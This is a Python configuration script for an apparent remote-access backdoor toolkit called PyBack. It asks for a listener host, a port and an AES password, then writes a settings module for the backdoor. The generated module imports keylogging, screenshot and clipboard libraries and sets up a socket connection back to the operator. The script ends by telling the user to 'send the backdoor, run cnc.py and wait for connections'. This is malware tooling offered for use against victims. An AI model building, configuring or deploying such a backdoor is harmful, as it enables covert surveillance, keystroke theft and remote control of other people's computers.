#!/usr/bin/python
# -*- encoding: utf-8 -*-

import subprocess
import platform
import sys

# detect OS type ###############
if "Linux" in platform.uname():
    os_type = "linux"
    subprocess.call("clear",shell=True)
    setting_path = "lib/setting.py"
else:
    os_type = "windows"
    subprocess.call("cls", shell=True)
    setting_path = "lib\\setting.py"

# color codes ###########
red = "\033[1;32;31m"
green = "\033[1;32;32m"
yellow = "\033[1;32;33m"
blue = "\033[1;32;34m"
cyan = "\033[1;32;36m"
black = "\033[1;32;30m"
r = "\x1b[0m"


banner = yellow + """

                        ██████╗░██╗░░░██╗██████╗░░█████╗░░█████╗░██╗░░██╗
                        ██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
                        ██████╔╝░╚████╔╝░██████╦╝███████║██║░░╚═╝█████═╝░
                        ██╔═══╝░░░╚██╔╝░░██╔══██╗██╔══██║██║░░██╗██╔═██╗░
                        ██║░░░░░░░░██║░░░██████╦╝██║░░██║╚█████╔╝██║░╚██╗
                        ╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝


                                      Configuration Script 
                                      ====================

                                    Created by: 7h3w4lk3r

                                 https://github.com/7h3w4lk3r
                                 Email : bl4ckr4z3r@gmail.com\n\n
""" + r


def generator():
    print green,"\n[!] Generating new setting for listener and backdoor [!]\n",r
    print yellow,"Enter the setting parameters for CNC and backdoor :\n",r
    dns = raw_input("[>] LHOST IP or DNS (default: 0.0.0.0): ")
    if dns == "":
        dns = "0.0.0.0"
    port = raw_input("[>] LPORT (default: 6000): ")
    if port == "":
        port = 6000
    port = int(port)
    password = raw_input("[>] Password for AES communication encryption (default: 'djknBDS89dHFS(*HFSD())'): ")
    if password == "":
        password = "djknBDS89dHFS(*HFSD())"
    while True:
        print blue, "\n\n[*] Verify your settings [*]\n"
        print "DNS/IP : ", dns
        print "port: ", port
        print "AES encryption password : ", password
        print r
        vrfy = raw_input("\n[*] is everything correct ? (Y/n): ")
        if vrfy == "y" or vrfy == "Y" or vrfy == "":
            break
        elif vrfy == "n":
            generator()
        else:
            print red,"\n[!] wrong input [!]\n",r
            continue

    setting = """
import socket
import ctypes
import platform
import shutil
from mss import mss
import pyperclip
import os
import sys
import subprocess
import json
import os
from Crypto import Random
from Crypto.Cipher import AES
import hashlib
import base64
import pynput.keyboard
import threading

global ip, port, TMP, APPDATA, path, os_type, access_password, password

# detect OS type ###############
if "Linux" in platform.uname():
    os_type = "linux"
else:
    os_type = "windows"

# set windows temp and appdata directory ######
if os_type == "windows":
    try:
        TMP = os.environ["TEMP"]
        APPDATA = os.environ["APPDATA"]
    except:
        pass
else:
    TMP = "/tmp"

# connection/access settings ##############
dns = """+"'"+dns+"'"+"""
port = """+str(port)+"""
ip = socket.gethostbyname(dns)
# AES channel password ##############
password = """+"'"+password+"'"+"""
"""
    f = open(setting_path,"w")
    f.write(setting)
    f.close()
    print yellow,"\n\n[*] setting file created [*]\n now send the backdoor, run cnc.py and wait for connections...\n happy hacking:)"

generator()
